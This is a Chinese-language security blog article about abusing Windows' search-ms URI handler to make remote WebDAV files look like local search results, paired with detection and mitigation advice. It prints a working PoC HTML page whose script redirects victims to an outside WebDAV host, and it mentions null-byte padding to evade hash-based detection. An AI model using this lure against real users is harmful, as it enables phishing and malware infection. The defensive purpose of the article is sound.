#  利用Windows原生Search-ms的恶意利用技术

原创 绝对防御局 [ 绝对防御局 ](javascript:void\(0\);)

**绝对防御局** ![]()

微信号 Absolute-Defense

功能介绍 专注于入侵检测、红蓝对抗的安全内容分享

____

___发表于_

收录于合集

#红蓝对抗 2 个

#Windows 3 个

#入侵检测 6 个

> 微信公众号： **绝对防御局**
>
> 关注可了解更多关于 红蓝对抗、安全防御等安全tips ;
>
> 有任何的问题或建议，欢迎公众号留言;

自Windows Vista开始，Windows系统默认支持一些有趣的搜索功能。其中使用 `search-
ms`这种URI协议处理，增强了本地的搜索能力，同时也允许本机对位于远程主机上的文件共享进行查询。

最近，Trellix的研究人员发现了一种新型攻击技术，利用远程托管的文件搜索结果显示在Windows资源管理中，伪装成本地文件搜索结果一样，欺骗受害者执行远程恶意文件。利用这个协议的强大功能，研究者成功在各种脚本文件进行执行利用，包括Batch、Visual
Basic、PHP和PowerShell。

## 0x01 技术分析

简单看下攻击链路

  
![]()  

攻击者可通过Email等常规方式进行恶意Payload的初步投递，无论是HTML还是PDF只要带上相关的serach-
ms链接，等待用户点击之后通过浏览器直接执行弹出“打开Windows资源管理器”的按钮，用户通过直接点击即可直接导航至攻击者相关的恶意程序服务器，此时可通过各种伪装LNK等方式欺骗受害者进行恶意程序不落盘的执行。

参考 `@mariuszbit`的Poc测试

  

![]()

    
          1. <html>
    
      2. <head>
    
      3.     <title>search-ms</title>
    
      4.     <script>
    
      5.         window.location.href = 'search-ms:query=test&crumb=location:\\\\dav.binary-offensive.com@SSL\\webdav&displayname=Hello, is it me you\'re looking for?';
    
      6.     </script>
    
      7. </head>
    
      8. <body>
    
      9. <center>
    
      10.     PoC triggering Microsoft's <b>search-ms</b> URI handler to open up Explorer previewing attacker's WebDAV contents.</br>
    
      11.     This is to lure victims into opening malicious files which could have led to their computers infection.<br/>
    
      12. </center>
    
      13. </body>
    
      14. </html>
    
    
    

![]()  

实际JS执行的Payload

    
          1. search-ms:query=test&crumb=location:\\dav.binary-offensive.com@SSL\webdav&displayname=Hello, is it me you\'re looking for?
    
    
    

query参数表示实际右侧的搜索内容，crumb表示实际的执行请求的资源，displayname表示搜索栏显示的内容。从而伪装成本地文件，欺骗用户进行执行。

![]()

实际过程中攻击者可以利用快捷方式/ISO等手法进行自定义的恶意程序代码执行。![]()

![]()

![]()

其中攻击者也习惯尝试添加空字节绕过基于文件Hash的IOC检测。

## 0x02 检测与防御

测试中可以发现外部资源的访问实际是使用WebDAV协议访问远程服务器上的文件和文件夹

![]()

在执行相关搜索到的应用程序时也能发现执行的是外部资源文件

![]()

所以，防御方可通过匹配如regsvr32、powershell等利用系统内置程序且尝试进行外连（包含`\\`）执行的行为，正常内部除开启了域内的网络共享之外，确认相关链接即可检测判断出异常行为。  
根据实际情况也可直接禁用原生的search-ms协议

    
          1. reg delete HKEY_CLASSES_ROOT\search /f
    
      2.   3. reg delete HKEY_CLASSES_ROOT\search-ms /f
    
    
    

## 0x03 参考

https://www.trellix.com/en-us/about/newsroom/stories/research/beyond-file-
search-a-novel-method.html

https://twitter.com/mariuszbit/status/1684868270287949827

  
感谢关注 :)  

  

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

